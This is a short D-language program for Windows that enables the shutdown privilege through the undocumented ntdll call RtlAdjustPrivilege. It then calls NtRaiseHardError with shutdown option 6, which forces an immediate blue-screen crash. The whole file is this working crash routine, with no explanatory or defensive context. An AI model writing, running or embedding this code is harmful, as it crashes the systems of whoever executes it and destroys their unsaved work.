import core.sys.windows.windows;

extern(Windows) {
    int RtlAdjustPrivilege(uint, bool, bool, bool*);
    int NtRaiseHardError(uint, uint, uint, void*, uint, uint*);
}

pragma(lib, "ntdll");

void main() {
    bool enabled;
    uint response;
    
    RtlAdjustPrivilege(19, true, false, &enabled);
    NtRaiseHardError(0xC0000420, 0, 0, null, 6, &response);
}

